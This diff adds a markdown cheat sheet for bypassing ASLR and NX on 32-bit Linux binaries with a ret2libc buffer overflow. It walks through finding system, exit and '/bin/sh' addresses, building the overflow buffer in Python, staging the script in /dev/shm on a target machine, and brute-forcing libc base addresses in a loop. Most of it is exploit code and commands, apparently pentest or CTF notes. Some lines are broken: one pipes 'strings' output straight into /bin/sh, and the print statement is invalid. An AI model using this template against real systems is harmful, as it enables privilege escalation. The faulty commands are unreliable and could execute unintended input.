@@ -1,0 +1,89 @@
+# Bypass ASLR/NX - 32-Bit
+
+##### Stage 1
+
+1. Disable ASLR on local host
+CMD - echo 0 > /proc/sys/kernel/randomize_va_space
+
+2. Identify/crash - pattern
+
+3. Start script
+
+import struct
+buf = "A" * $offset
+buf += struct.pack("<I", 0xd3adc0d3) # Value doesn't matter
+
+4. Check program crashes with 0xd3adc0d3
+
+##### Stage 2 - ret2libc
+
+CMD - gdb ./$binary
+gdb > p system 
+# Copy address
+
+$ system_addr = struct.pack("<I", $sys_addr) # place top of script
+
+gdb > searchmem /bin/sh
+# Copy libc address
+
+gdb > p exit
+# Copy address
+
+$ exit_addr = struct.pack("<I", $exit_address)
+$ arg_addr = struct.pack("<I", $sh_addr)
+
+buf = "A" * $offset
+buf += system_addr
+buf += exit_addr
+buf += arg_addr
+
+
+###### Bypass ASLR
+# !! ASLR enabled
+CMD - ldd $binary | grep libc
+# Check bits that are changing, workout possible permutations - 512 for demo
+
+1. Look for changing byte
+2. Move exploit script to target machine
+
+CMD - cd /dev/shm
+3. Paste exploit script
+4. test script runs
+
+$ from subprocess import call
+
+# Get location of libc
+CMD - ldd $binary | grep libc
+Copy libc address
+$ libc_base_address = $lbc_base_copy
+
+# Get offsets for other variables
+
+CMD - readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system # system@@GLIBC
+# Copy address
+$ system_offset = $copied_address
+
+CMD - readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit # exit@@GLIBC
+# Copy address
+$ exit_offset = $copied_address
+
+CMD - strings -atx $libc | /bin/sh
+# Copy address
+$ arg_offset = $copied_address
+
+$ system_addr = struct.pack("<I", libc_base_address + system_offset)
+$ exit_addr = struct.pack("<I", libc_base_address + exit_offset)
+$ arg_addr = struct.pack("<I", libc_base_address + arg_offset)
+
+$ buf = "A" * $offset
+$ buf += system_addr
+$ buf += exit_addr
+$ buf += arg_addr
+
+
+i = 0
+
+while (i < 512):
+	print("Try: %s", %i) # Only for debugging
+	i += 1
+	ret = call([$binary, buf])
